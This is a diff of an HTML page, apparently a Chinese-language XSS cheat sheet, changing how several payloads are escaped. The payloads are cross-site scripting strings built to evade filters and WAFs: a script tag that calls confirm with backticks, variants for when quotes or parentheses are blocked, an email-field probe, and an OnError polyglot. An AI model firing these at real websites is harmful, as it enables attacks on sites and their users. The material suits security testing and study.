@@ -236,7 +236,7 @@
 </li>
 <li><p>无危害探测标签，基本不会触发waf</p>
 <ul>
-<li><p>‘ “&gt;</tExtArEa><s>123#&#x2F;&#x2F;–+ (最常用，只要有划了个横线的123就代表有XSS)</p>
+<li><p>‘ “&gt;&lt; &#x2F;tExtArEa&gt;&lt; s&gt;123#&#x2F;&#x2F;–+ (最常用，只要有划了个横线的123就代表有XSS)</p>
 </li>
 <li><p><code>&lt;s&gt;123</code></p>
 </li>
@@ -297,13 +297,13 @@
 <li><p>禁用单引号</p>
 <p>要注意数字可以不带单引号</p>
 <ul>
-<li><code><script>confirm( `xss `)</script></code></li>
+<li>&lt; script&gt;confirm( `xss `)&lt; &#x2F;script&gt;</li>
 <li><code>&lt;script&gt;confirm(/xss/)&lt;/script&gt;</code></li>
 </ul>
 </li>
 <li><p>过滤括号</p>
 <p>可以使用反单引号来代替</p>
-<p><code>&lt;script&gt;alert\</code>xss `</script>&#96;</p>
+<p>&lt; script&gt;alert`xss `&lt; &#x2F;script&gt;</p>
 </li>
 <li><p>过滤尖括号&lt;&gt;</p>
 <p>如果&lt;&gt;被过滤，但下面的标签里会输出内容，可以通过伪协议绕过</p>
@@ -358,7 +358,7 @@
 </li>
 <li><p>#上面那么多是一整个xss大混杂</p>
 </li>
-<li><p>“&quot;&gt;<s><a href="mailto:&#49;&#50;&#x33;&#x35;&#54;&#x37;&#56;&#x39;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#49;&#50;&#x33;&#x35;&#54;&#x37;&#56;&#x39;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a>    邮箱xss(验证)</p>
+<li><p>“&quot;&gt;&lt; s&gt;<a href="mailto:&#x31;&#50;&#x33;&#53;&#x36;&#x37;&#56;&#57;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#x31;&#50;&#x33;&#53;&#x36;&#x37;&#56;&#57;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;</a>    邮箱xss(验证)</p>
 </li>
 <li><p><code>&lt;sTylE OnLoAd=alert(1)&gt;</code></p>
 </li>
@@ -409,7 +409,7 @@
 </li>
 <li><p><code><w="/x="y>"/oNDblCliCk=`<`[confir\u006d``]>dianwo2 </code>    需要双击</p>
 </li>
-<li><p><code><!'/*"/*/'/*/"/*--></Script>&lt;Image SrcSet&#x3D;K *&#x2F;; OnError&#x3D;confirm`1` &#x2F;&#x2F;&gt;</code></p>
+<li><p><code><!'/*"/*/'/*/"/*-->< /Script><Image SrcSet=K */; OnError=confirm`1` //></code></p>
 </li>
 <li><p><code>&lt;img/src/onerror=\u0061\u006c\u0065\u0072\u0074(1)&gt;</code></p>
 </li>
